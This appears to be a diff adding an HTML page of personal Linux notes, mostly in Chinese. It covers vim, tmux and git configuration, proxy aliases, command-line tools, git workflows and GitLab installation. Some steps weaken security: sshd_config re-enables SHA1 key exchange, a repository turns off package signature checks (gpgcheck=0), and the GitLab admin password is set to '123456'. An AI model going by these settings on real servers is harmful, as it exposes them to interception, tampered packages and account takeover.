+set includeexpr=substitute(v:fname,'\\.','/','g')
+&quot; suffixesadd为尝试路径后缀，详情help suffixesadd
+set suffixesadd=.lua
+set suffixesadd+=.proto
+if filereadable(&quot;./.workspace.vim&quot;)
+    source ./.workspace.vim
+endif
+
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;NerdTree setting
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+set encoding=utf-8
+set termencoding=utf-8
+set fileencoding=chinese
+set fileencodings=ucs-bom,utf-8,chinese
+set langmenu=zh_CN.utf-8
+&quot;language messages zh_cn.utf-8
+
+&quot;Show line number.
+let g:NERDTreeShowlineNumber=1
+
+&quot;Show hide file.
+let g:NERDTreeHidden=1
+
+&quot;Show Node model.
+let NERDTreeDirArrows=0
+
+&quot;Delete help information at the top
+let NERDTreeMinimalUI=1
+
+let g:NERDTreeDirArrowExpandable = '|'
+let g:NERDTreeDirArrowCollapsible = '/'
+
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;end NerdTree setting
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;nerdtree-git-plugin setting
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+let g:NERDTreeGitStatusIndicatorMapCustom = {
+    \ &quot;Modified&quot;  : &quot;✹&quot;,
+    \ &quot;Staged&quot;    : &quot;✚&quot;,
+    \ &quot;Untracked&quot; : &quot;✭&quot;,
+    \ &quot;Renamed&quot;   : &quot;➜&quot;,
+    \ &quot;Unmerged&quot;  : &quot;═&quot;,
+    \ &quot;Deleted&quot;   : &quot;✖&quot;,
+    \ &quot;Dirty&quot;     : &quot;✗&quot;,
+    \ &quot;Clean&quot;     : &quot;✔︎&quot;,
+    \ &quot;Unknown&quot;   : &quot;?&quot;
+    \ }
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;end nerdtree-git-plugin setting
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;vim-nerdtree-syntax-highlight settings
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;Highlight full name (not only icons). You need to add this if you don't have vim-devicons and want highlight.
+let g:NERDTreeFileExtensionHighlightFullName = 1
+let g:NERDTreeExactMatchHighlightFullName = 1
+let g:NERDTreePatternMatchHighlightFullName = 1
+
+&quot;Highlight full name (not only icons). You need to add this if you don't have vim-devicons and want highlight.
+let g:NERDTreeHighlightFolders = 1
+
+&quot;highlights the folder name
+let g:NERDTreeHighlightFoldersFullName = 1
+
+&quot;you can add these colors to your .vimrc to help customizing
+let s:brown = &quot;905532&quot;
+let s:aqua =  &quot;3AFFDB&quot;
+let s:blue = &quot;689FB6&quot;
+let s:darkBlue = &quot;44788E&quot;
+let s:purple = &quot;834F79&quot;
+let s:lightPurple = &quot;834F79&quot;
+let s:red = &quot;AE403F&quot;
+let s:beige = &quot;F5C06F&quot;
+let s:yellow = &quot;F09F17&quot;
+let s:orange = &quot;D4843E&quot;
+let s:darkOrange = &quot;F16529&quot;
+let s:pink = &quot;CB6F6F&quot;
+let s:salmon = &quot;EE6E73&quot;
+let s:green = &quot;8FAA54&quot;
+let s:Turquoise = &quot;40E0D0&quot;
+let s:lightGreen = &quot;31B53E&quot;
+let s:white = &quot;FFFFFF&quot;
+let s:rspec_red = &quot;FE405F&quot;
+let s:git_orange = &quot;F54D27&quot;
+let s:gray = &quot;808A87&quot;
+
+let g:NERDTreeExtensionHighlightColor = {} &quot; this line is needed to avoid error
+let g:NERDTreeExtensionHighlightColor['o'] = s:gray &quot; sets the color of o files to blue
+let g:NERDTreeExtensionHighlightColor['h'] = s:blue &quot; sets the color of h files to blue
+let g:NERDTreeExtensionHighlightColor['c'] = s:green &quot; sets the color of c files to blue
+let g:NERDTreeExtensionHighlightColor['cpp'] = s:green &quot; sets the color of cpp files to blue
+let g:NERDTreeExtensionHighlightColor['c++'] = s:green &quot; sets the color of c++ files to blue
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;end vim-nerdtree-syntax-highlight settings
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;vim-devicons settings
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;`
+set encoding=UTF-8
+
+&quot;Can be enabled or disabled
+let g:webdevicons_enable_nerdtree = 1
+
+&quot;whether or not to show the nerdtree brackets around flags
+let g:webdevicons_conceal_nerdtree_brackets = 1
+
+&quot;adding to vim-airline's tabline
+let g:webdevicons_enable_airline_tabline = 1
+
+&quot;adding to vim-airline's statusline
+let g:webdevicons_enable_airline_statusline = 1
+
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot;end vim-devicons settings
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;`
+
+set incsearch
+</code></pre>
+<h2 id="tmuxconf"><a class="header" href="#tmuxconf">tmux.conf</a></h2>
+<pre><code>set -g default-terminal &quot;screen-256color&quot;
+set-option allow-rename off
+#-- base settings --#
+set -g mode-keys vi
+# prefix key (Ctrl+a)
+set -g prefix ^a
+unbind ^b
+bind ^a send-prefix
+
+#up
+bind-key k select-pane -U
+#down
+bind-key j select-pane -D
+#left
+bind-key h select-pane -L
+#right
+bind-key l select-pane -R
+</code></pre>
+<h2 id="gitconfig"><a class="header" href="#gitconfig">.gitconfig</a></h2>
+<pre><code>[user]
+    name = cfanzp
+    email = cfan.zp@qq.com
+[color]
+    interactive = auto
+    diff = auto
+    status = auto
+    branch = auto
+    ui = true
+    repositoryformatversion = 0
+    filemode = true
+    bare = false
+    logallrefupdates = true
+    ignorecase = true
+    precomposeunicode = false
+
+[alias]
+    co = checkout
+    ci = commit
+    st = status
+    sh = stash
+    sa = stash apply
+    sp = stash pop
+    ap = add -p
+    br = branch
+    cp = checkout -p
+    cv = commit -v
+    dc = diff --cached
+    d = diff
+    pr = pull --rebase
+    ps = push
+    l = log --graph --pretty=format:'%C(yellow)%h%Creset %C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --date=short --all
+    lg = log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --all
+[hub]
+    protocol = https
+[diff]
+    tool = vimdiff
+[core]
+    editor = vim
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="linux如何配置命令行全局代理"><a class="header" href="#linux如何配置命令行全局代理">linux如何配置命令行全局代理？</a></h1>
+<h2 id="为什么要配置命令行全局代理"><a class="header" href="#为什么要配置命令行全局代理">为什么要配置命令行全局代理？</a></h2>
+<ul>
+<li>我们在go语言开发的时候，安装vim插件的时候，有些资源不使用代理无法下载。这个时候配置一个全局代理，问题就轻松解决了。</li>
+</ul>
+<h2 id="配置"><a class="header" href="#配置">配置</a></h2>
+<ul>
+<li>在家目录中的.profile或.bash_profile文件中加入如下别名配置</li>
+<li>这里配置的是socks5代理</li>
+<li>http代理配置只需要把配置socks改成http即可</li>
+</ul>
+<pre><code>alias proxy='export all_proxy=socks5://127.0.0.1:1080;export http_proxy=socks5://127.0.0.1:1080;export https_proxy=socks5://127.0.0.1:1080;export no_proxy=socks5://127.0.0.1:1080; export ALL_PROXY=socks5://127.0.0.1:1080;export HTTP_PROXY=socks5://127.0.0.1:1080;export HTTPS_PROXY=socks5://127.0.0.1:1080;export NO_PROXY=socks5://127.0.0.1:1080'
+alias unproxy='unset all_proxy; unset http_proxy; unset https_proxy;unset no_proxy; unset ALL_PROXY; unset HTTP_PROXY; unset HTTPS_PROXY;unset NO_PROXY'
+</code></pre>
+<h2 id="使用方法"><a class="header" href="#使用方法">使用方法</a></h2>
+<ul>
+<li>开启代理</li>
+</ul>
+<pre><code>proxy
+</code></pre>
+<ul>
+<li>关闭代理</li>
+</ul>
+<pre><code>unproxy
+</code></pre>
+<h2 id="测试"><a class="header" href="#测试">测试</a></h2>
+<pre><code>curl github.com
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><ol>
+<li>linux tools</li>
+</ol>
+<h2 id="实用工具"><a class="header" href="#实用工具">实用工具</a></h2>
+<h3 id="fanyi-翻译工具"><a class="header" href="#fanyi-翻译工具">fanyi 翻译工具</a></h3>
+<ol>
+<li>安装: npm install fanyi -g</li>
+<li>注意linux版本需要festval来支持发音，可以屏蔽:lib/fanyi/...../index.js中发音相关代码来使功能正常</li>
+</ol>
+<h3 id="translate-shell-翻译工具"><a class="header" href="#translate-shell-翻译工具">translate-shell 翻译工具</a></h3>
+<ol>
+<li>安装:</li>
+</ol>
+<ul>
+<li>sudo pacman -S translate-shell</li>
+<li>下载安装:
+wget git.io/trans
+chmod +x ./trans
+sudo mv trans /usr/bin/</li>
+<li>github 安装:
+git clone https://github.com/soimort/translate-shell &amp;&amp; cd translate-shell
+make
+make install</li>
+</ul>
+<ol start="2">
+<li>使用
+<ul>
+<li>英译中: trans :zh good</li>
+<li>中译英: trans :en good</li>
+<li>trans [原语种]:[目标语种] [要查的词|字|句]</li>
+</ul>
+</li>
+<li>查看语言代码:
+<ul>
+<li>trans -R</li>
+<li>trans -T</li>
+<li>帮助: https://blog.csdn.net/linuxprobe2017/article/details/78795009</li>
+</ul>
+</li>
+</ol>
+<h3 id="jq-命令行json格式化工具"><a class="header" href="#jq-命令行json格式化工具">jq 命令行json格式化工具</a></h3>
+<ol>
+<li>用法：</li>
+</ol>
+<ul>
+<li>cat 1.json | jq</li>
+<li>cat 1.json | jq -C 带颜色</li>
+<li>cat 1.json | jq -M 不带颜色</li>
+<li>jq . 1.json  显示所有</li>
+<li>jq '.[0]' TableCard.json 显示匹配的0号</li>
+<li>jq '.[0] | length' TableCreateConfigList.json 获取元素个数</li>
+</ul>
+<ol start="2">
+<li>帮助：https://blog.csdn.net/weixin_33842328/article/details/85064554</li>
+</ol>
+<h3 id="graphviz-命令行绘制流程图"><a class="header" href="#graphviz-命令行绘制流程图">graphviz 命令行绘制流程图</a></h3>
+<ol>
+<li>帮助：</li>
+</ol>
+<ul>
+<li>官网：http://www.graphviz.org/download/source/</li>
+<li>相关介绍：https://www.zhihu.com/question/28596616</li>
+</ul>
+<h3 id="axel"><a class="header" href="#axel">axel</a></h3>
+<ol>
+<li>使用</li>
+</ol>
+<ul>
+<li>axel -n 20 http://www.baidu.com/download/a.zip</li>
+<li>download:https://github.com/axel-download-accelerator/axel.git</li>
+</ul>
+<h3 id="compare-比较图片"><a class="header" href="#compare-比较图片">compare 比较图片</a></h3>
+<h3 id="how2"><a class="header" href="#how2">how2</a></h3>
+<h3 id="tldr--手册页简化工具"><a class="header" href="#tldr--手册页简化工具">tldr  手册页简化工具</a></h3>
+<h3 id="fpppathpicker"><a class="header" href="#fpppathpicker">fpp(pathpicker)</a></h3>
+<ol>
+<li>cd /usr/local</li>
+<li>git clone https://github.com/facebook/PathPicker.git</li>
+</ol>
+<h3 id="rgripgrep"><a class="header" href="#rgripgrep">rg(ripgrep)</a></h3>
+<ol>
+<li>github:https://github.com/BurntSushi/ripgrep</li>
+<li>install
+sudo pacman -S ripgrep</li>
+<li>centos install:
+sudo yum-config-manager --add-repo=https://copr.fedorainfracloud.org/coprs/carlwgeorge/ripgrep/repo/epel-7/carlwgeorge-ripgrep-epel-7.repo
+sudo yum install ripgrep</li>
+</ol>
+<h3 id="you-get"><a class="header" href="#you-get">you-get</a></h3>
+<h3 id="lsix"><a class="header" href="#lsix">lsix</a></h3>
+<ol>
+<li>安装：</li>
+</ol>
+<ul>
+<li>sudo pacman -S imagemagick</li>
+<li>下载：https://imagemagick.org/script/download.php</li>
+<li>https://github.com/ImageMagick/ImageMagick.git</li>
+</ul>
+<ol start="2">
+<li>使用帮助:https://ywnz.com/linuxml/3940.html</li>
+</ol>
+<h3 id="mobaxterm"><a class="header" href="#mobaxterm">mobaxterm</a></h3>
+<ol>
+<li>安装: https://mobaxterm.mobatek.net/download-home-edition.html</li>
+</ol>
+<ul>
+<li>axel -n 20 https://download.mobatek.net/2032020060430358/MobaXterm_Portable_v20.3.zip</li>
+</ul>
+<h3 id="vim-插件coc"><a class="header" href="#vim-插件coc">vim 插件coc</a></h3>
+<ol>
+<li>安装</li>
+</ol>
+<ul>
+<li>Plug 'neoclide/coc.nvim', {'branch': 'release'}</li>
+</ul>
+<ol start="2">
+<li>帮助</li>
+</ol>
+<ul>
+<li>https://www.jianshu.com/p/55cf1fa7a467</li>
+<li>github:https://github.com/neoclide/coc.nvim/wiki/Language-servers</li>
+</ul>
+<h3 id="mycli"><a class="header" href="#mycli">mycli</a></h3>
+<ol>
+<li>centos 安装</li>
+</ol>
+<ul>
+<li>升级python2到python3
+<ol>
+<li>wget https://www.python.org/ftp/python/3.6.4/Python-3.6.4.tgz</li>
+<li>./configure --prefix=/usr/local/python3</li>
+<li>make</li>
+<li>make install</li>
+<li>mv /usr/bin/python /usr/bin/python_bak</li>
+<li>ln -s /usr/local/python3/bin/python3 /usr/bin/python</li>
+<li>pip3.6 install mycli
+8 .ln -s /usr/local/bin/mycli /usr/bin/mycli</li>
+</ol>
+</li>
+</ul>
+<h3 id="cmus-音乐播放器"><a class="header" href="#cmus-音乐播放器">cmus 音乐播放器</a></h3>
+<ul>
+<li>https://github.com/cmus/cmus</li>
+</ul>
+<h3 id="制作个人的博客笔记系统"><a class="header" href="#制作个人的博客笔记系统">制作个人的博客笔记系统</a></h3>
+<ol>
+<li>markdown + pandoc + makefile + git(github)参考：http://www.mikewootc.com/wiki/tool/sitebuild/mikewiki.html</li>
+</ol>
+<h3 id="磁盘相关"><a class="header" href="#磁盘相关">磁盘相关</a></h3>
+<ul>
+<li>duf 查看磁盘使用情况</li>
+<li>du 查看各个文件占用磁盘情况</li>
+<li>df 查看磁盘暂用情况</li>
+</ul>
+<h2 id="网络安全工具"><a class="header" href="#网络安全工具">网络安全工具</a></h2>
+<ul>
+<li>PortBender</li>
+</ul>
+<pre><code>https://github.com/praetorian-inc/PortBender
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="常用命令"><a class="header" href="#常用命令">常用命令</a></h1>
+<h2 id="sed批量替换"><a class="header" href="#sed批量替换">sed批量替换</a></h2>
+<ul>
+<li>批量替换单个文件中的内容</li>
+</ul>
+<pre><code>set -i 's/land_logic/runner_logic/g' ./ctp_single.lua
+</code></pre>
+<ul>
+<li>批量替换多个文件中的内容</li>
+</ul>
+<pre><code>ag land_logic -l |xargs sed -i 's/land_logic/runner_logic/g'
+set -i 's/land_logic/runner_logic/g' `ag land_logic rl ./*.lua`
+</code></pre>
+<h2 id="tar"><a class="header" href="#tar">tar</a></h2>
+<ul>
+<li>打包redis目录</li>
+</ul>
+<pre><code>tar -czvf redis.tar.gz redis
+</code></pre>
+<h2 id="7z"><a class="header" href="#7z">7z</a></h2>
+<ul>
+<li>解压 icon.7z</li>
+</ul>
+<pre><code>7z x icon.7z
+</code></pre>
+<ul>
+<li>manjaro 拓展
+<ol>
+<li>url:https://jingyan.baidu.com/article/6766299702211f14d51b8491.html</li>
+</ol>
+</li>
+</ul>
+<h2 id="ssh"><a class="header" href="#ssh">ssh</a></h2>
+<ul>
+<li>公私密钥登录</li>
+</ul>
+<pre><code>ssh root@123.207.126.144 -p22 -i id_rsa
+</code></pre>
+<h2 id="ssh无法连接"><a class="header" href="#ssh无法连接">ssh无法连接</a></h2>
+<ul>
+<li>ssh登陆报错“WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!”问题原因及解决方法</li>
+</ul>
+<pre><code>删除对应ip的在known_hosts相关信息
+vim /.ssh/known_hosts
+</code></pre>
+<ul>
+<li>ssh 升级 openssh 8.8sp1</li>
+</ul>
+<pre><code>https://blog.csdn.net/qq_29974229/article/details/120888947
+</code></pre>
+<ul>
+<li>升级openssh反馈gitlab相关配置失效 git clone 需要输入密码</li>
+</ul>
+<pre><code>https://blog.csdn.net/qq_43297703/article/details/106123791?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore
+
+#vim /etc/ssh/sshd_config
+KexAlgorithms diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group1-sha1,curve25519-sha256@libssh.org
+
+重启sshd:
+#service sshd restart
+确认ssh公钥已经上传到gitlab密钥之后，查看一下git用户是否被锁定
+执行命令：sudo passwd -u git
+强制执行命令：sudo passwd -u -f git
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="git"><a class="header" href="#git">git</a></h1>
+<h2 id="git-缩写配置"><a class="header" href="#git-缩写配置">git 缩写配置</a></h2>
+<ul>
+<li>在home目录创建.gitconfig文件复制粘贴以下配置并保存退出</li>
+</ul>
+<pre><code>[user]
+  name = xx
+  email = xx@qq.com
+[color]
+  interactive = auto
+  diff = auto
+  status = auto
+  branch = auto
+  ui = true
+  repositoryformatversion = 0
+  filemode = true
+  bare = false
+  logallrefupdates = true
+  ignorecase = true
+  precomposeunicode = false
+
+[alias]
+  co = checkout
+  ci = commit
+  st = status
+  sh = stash
+  sa = stash apply
+  sp = stash pop
+  ap = add -p
+  br = branch
+  cp = checkout -p
+  cv = commit -v
+  dc = diff --cached
+  d = diff
+  pr = pull --rebase
+  ps = push
+  l = log --graph --pretty=format:'%C(yellow)%h%Creset %C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --date=short --all
+  lg = log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --all
+[hub]
+  protocol = https
+[diff]
+  tool = vimdiff
+[core]
+  editor = vim
+</code></pre>
+<h2 id="常用缩写"><a class="header" href="#常用缩写">常用缩写</a></h2>
+<pre><code>git co
+git br
+git ci
+git lg
+</code></pre>
+<h2 id="工作流"><a class="header" href="#工作流">工作流</a></h2>
+<ol>
+<li>开发新功能a</li>
+</ol>
+<pre><code class="language-mermaid">sequenceDiagram
+　　　participant proj1
+　　　participant a
+　　　proj1-&gt;&gt;a:基于proj1分支创建一个a分支(step1)
+　　　a-&gt;&gt;proj1:a分支开发完后合并入proj1分支,并删除a分支(step2)
+</code></pre>
+<pre><code>step1:
+git br a proj1
+git push origin a
+
+step2:
+git co proj1
+git pull
+git co a
+git merge proj1
+git push
+
+git co proj1
+git merge a
+git push
+git br -D a
+</code></pre>
+<h2 id="常用命令-1"><a class="header" href="#常用命令-1">常用命令</a></h2>
+<ul>
+<li>删除远程分支a:
+<ul>
+<li>切换到本地其它分支,如master</li>
+</ul>
+</li>
+</ul>
+<pre><code>git co master
+</code></pre>
+<ul>
+<li>删除远程分支</li>
+</ul>
+<pre><code>git push origin --delete a
+</code></pre>
+<ul>
+<li>修改远程分支地址</li>
+</ul>
+<pre><code>git remote -v
+git remote rm origin
+git remote add origin git@gitee.com:cfanzp/linux_note.git
+</code></pre>
+<h3 id="git-tag"><a class="header" href="#git-tag">git tag</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody>
+<tr><td>git tag</td><td>查看标签列表</td></tr>
+<tr><td>git tag -l &quot;v1.0*&quot;</td><td>模糊匹配查询</td></tr>
+<tr><td>git tag --list &quot;v0.0*&quot;</td><td>模糊匹配查询</td></tr>
+<tr><td>git tag -a v1.0 -m &quot;my version 1.0&quot;</td><td>添加附注标签</td></tr>
+<tr><td>git show v1.0</td><td>查看标签相关信息</td></tr>
+<tr><td>git tag -lw</td><td>创建轻量标签，git show 不会看到额外标签信息</td></tr>
+<tr><td>git tag -a v0.9 9fceb02</td><td>后期打标签</td></tr>
+<tr><td>git push origin --tags</td><td>将标签推送到远端</td></tr>
+<tr><td>git tag -d v1.0</td><td>删除标签</td></tr>
+<tr><td>git push origin --delete <tagname></td><td>删除远端标签</td></tr>
+</tbody></table>
+</div>
+<h3 id="git-diff"><a class="header" href="#git-diff">git diff</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody>
+<tr><td>git diff</td><td>查看差异</td></tr>
+<tr><td>git diff cached</td><td>查看工作版本和暂存的差异</td></tr>
+<tr><td>git diff HEAD</td><td>查看工作版本和HEAD的差异</td></tr>
+<tr><td>git diff HEAD^ HEAD</td><td>查看上上个版本和HEAD的差异</td></tr>
+<tr><td>git diff --stat</td><td>查看差异的文件列表</td></tr>
+<tr><td>git diff --stat ./client</td><td>查看client目录 差异的文件列表</td></tr>
+<tr><td>git diff &gt; patch</td><td>使用git diff 打补丁</td></tr>
+<tr><td>git apply --check patch</td><td>使用补丁,没有任何输出表示可以顺利接受这个补丁</td></tr>
+<tr><td>git apply --reject patch</td><td>使用补丁,冲突会生成.rej文件</td></tr>
+</tbody></table>
+</div>
+<h3 id="git-回退到某个版本"><a class="header" href="#git-回退到某个版本">git 回退到某个版本</a></h3>
+<ol>
+<li>git reset commit-id</li>
+<li>git push origin branch-name --force</li>
+</ol>
+<h3 id="远程分支更新"><a class="header" href="#远程分支更新">远程分支更新</a></h3>
+<ol>
+<li>git remote update origin --prune</li>
+</ol>
+<h2 id="删除所有历史commit创建一个新仓库"><a class="header" href="#删除所有历史commit创建一个新仓库">删除所有历史commit,创建一个新仓库</a></h2>
+<ol>
+<li>Checkout</li>
+</ol>
+<pre><code>   git checkout --orphan latest_branch
+</code></pre>
+<ol start="2">
+<li>Add all the files</li>
+</ol>
+<pre><code>   git add -A
+</code></pre>
+<ol start="3">
+<li>Commit the changes</li>
+</ol>
+<pre><code>   git commit -am &quot;commit message&quot;
+</code></pre>
+<ol start="4">
+<li>Delete the branch</li>
+</ol>
+<pre><code>   git branch -D master
+</code></pre>
+<ol start="5">
+<li>Rename the current branch to master</li>
+</ol>
+<pre><code>   git branch -m master
+</code></pre>
+<ol start="6">
+<li>Finally, force update your repository</li>
+</ol>
+<pre><code>   git push -f origin master
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="gitlab"><a class="header" href="#gitlab">gitlab</a></h1>
+<h2 id="gitlab-安装"><a class="header" href="#gitlab-安装">gitlab 安装</a></h2>
+<h3 id="配置要求"><a class="header" href="#配置要求">配置要求</a></h3>
+<pre><code>CPU:2核+
+内存:2G+
+</code></pre>
+<h3 id="gitlab服务器组成"><a class="header" href="#gitlab服务器组成">gitlab服务器组成</a></h3>
+<pre><code>1. nginx
+2. gitlab-shell
+3. gitlab-workhorse
+4. logrotate:日志文件管理工具
+5. postgresql:数据库
+6. redis:缓存数据库
+7. sidekiq:用于在后台执行队列任务
+8. unicorn:An HTTP server for Rack applications
+</code></pre>
+<h3 id="yum-安装"><a class="header" href="#yum-安装">yum 安装</a></h3>
+<ul>
+<li>新建 /etc/yum.repos.d/gitlab_gitlab-ce.repo</li>
+</ul>
+<pre><code>[gitlab-ce]
+name=Gitlab CE Repository
+baseurl=https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el$releasever/
+gpgcheck=0
+enabled=1
+</code></pre>
+<ul>
+<li>安装依赖</li>
+</ul>
+<pre><code>sudo yum install curl openssh-server openssh-clients postfix cronie
+sudo service postfix start
+sudo chkconfig postfix on
+#这句是用来做防火墙的，避免用户通过ssh方式和http来访问。
+sudo lokkit -s http -s ssh
+</code></pre>
+<ul>
+<li>再执行</li>
+</ul>
+<pre><code>sudo yum makecache
+sudo yum install gitlab-ce
+sudo gitlab-ctl reconfigure  #Configure and start GitLab
+</code></pre>
+<ul>
+<li>修改密码</li>
+</ul>
+<pre><code>gitlab-rails console -e production
+user = User.where(id:1).first
+user.password='123456'
+user.save!
+</code></pre>
+<h4 id="安装参考链接"><a class="header" href="#安装参考链接">安装参考链接</a></h4>
+<ul>
+<li>https://www.jianshu.com/p/b04356e014fa</li>
+</ul>
+<h3 id="安装包安装"><a class="header" href="#安装包安装">安装包安装</a></h3>
+<ul>
+<li>下载</li>
+</ul>
+<pre><code>wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-10.0.0-ce.0.el7.x86_64.rpm
+wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-14.3.2-ce.0.el7.x86_64.rpm
+</code></pre>
+<ul>
+<li>安装</li>
+</ul>
+<pre><code>rpm -i gitlab-ce-10.0.0-ce.0.el7.x86_64.rpm
+</code></pre>
+<ul>
+<li>修改配置:指定服务器ip以及自定义端口</li>
+</ul>
+<pre><code>vim  /etc/gitlab/gitlab.rb
+修改external_url
+</code></pre>
+<ul>
+<li>重置并启动GitLab</li>
+</ul>
+<pre><code>gitlab-ctl reconfigure
+gitlab-ctl restart
+</code></pre>
+<ul>
+<li>访问GitLab Web</li>
+</ul>
+<pre><code>如果没有域名，直接输入服务器ip和指定端口进行访问
+初始账户: root 密码:5iveL!fe
+</code></pre>
+<h4 id="参考链接"><a class="header" href="#参考链接">参考链接</a></h4>
+<ul>
+<li>https://www.cnblogs.com/zhangycun/p/10963094.html</li>
+</ul>
+<h2 id="常见问题"><a class="header" href="#常见问题">常见问题</a></h2>
+<h3 id="访问出现502错误"><a class="header" href="#访问出现502错误">访问出现502错误</a></h3>
+<ul>
+<li>8080端口被暂用原因</li>
+</ul>
+<pre><code>Whoops, GitLab is taking too much time to respond.
+关闭8080端口对应app或修改端口
+参考url:https://blog.csdn.net/mqdxiaoxiao/article/details/104422826
+</code></pre>
+<h2 id="gitlab目录结构"><a class="header" href="#gitlab目录结构">gitlab目录结构</a></h2>
+<pre><code>/opt/gitlab/ 　　                          # 主目录
+/etc/gitlab/ 　　                          # 放置配置文件
+/var/opt/gitlab/ 　　                      # 各个组件
+/var/log/gitlab/ 　　                      # 放置日志文件
+/var/opt/gitlab/git-data/repositories 　　 # 数据库的地址　　
+/var/opt/gitlab/postgresql/data 　　       # gitlab组和项目的地址
+/etc/gitlab/gitlab.rb                      # gitlab配置文件
+</code></pre>
+<h2 id="启动日志"><a class="header" href="#启动日志">启动日志</a></h2>
+<pre><code>[root@dev129 zp]# gitlab-ctl restart
+ok: run: alertmanager: (pid 70668) 1s
+ok: run: gitaly: (pid 70679) 0s
+ok: run: gitlab-exporter: (pid 70696) 1s
+ok: run: gitlab-workhorse: (pid 70700) 0s
+ok: run: grafana: (pid 70710) 0s
+ok: run: logrotate: (pid 70724) 0s
+ok: run: nginx: (pid 70732) 0s
+ok: run: node-exporter: (pid 70739) 0s
